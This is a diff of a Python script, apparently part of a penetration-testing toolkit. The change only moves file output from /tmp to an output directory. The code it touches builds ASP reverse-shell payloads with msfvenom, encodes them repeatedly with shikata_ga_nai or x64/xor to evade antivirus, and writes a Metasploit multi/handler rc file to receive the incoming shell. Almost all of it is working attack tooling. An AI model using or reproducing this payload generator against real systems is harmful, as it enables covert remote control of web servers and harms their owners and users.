@@ -37,10 +37,10 @@ while 1:
 		# create payload
 		if selection == '1' or selection == '':
 			PrintInfo("Creating payload with x10 x86/shikata_ga_nai. Please wait...")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 10 -f asp > /tmp/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()
+			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 10 -f asp > output/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()
 		elif selection == '2':
 			PrintInfo("Creating payload with x10 x64/xor. Please wait...")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x64/xor -i 10 -a 64 -f asp > /tmp/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()
+			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x64/xor -i 10 -a 64 -f asp > output/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()
 
 		
 		# start multi handler
@@ -48,7 +48,7 @@ while 1:
 		if not answer or answer in ('Y','y',''):
 	
 			# create rc file
-			rcfile = "/tmp/asp_listener.rc"
+			rcfile = "output/asp_listener.rc"
 			fw = open(rcfile, "w")
 			fw.write("use exploit/multi/handler\n")
 			fw.write("set PAYLOAD %s\n" % payload)
@@ -64,13 +64,13 @@ while 1:
 	
 			PrintInfo("Cleaning up...")
 			os.remove(rcfile)
-			os.remove("/tmp/"+filename+".asp")
+			os.remove("output/"+filename+".asp")
 			sleep(1)
 			# return to main menu
 			break
 	
 		else:
-			PrintInfo("Payload created in your /tmp directory.")
+			PrintInfo("Payload created in your output directory.")
 			
 			# return to main menu
 			EntContinue()
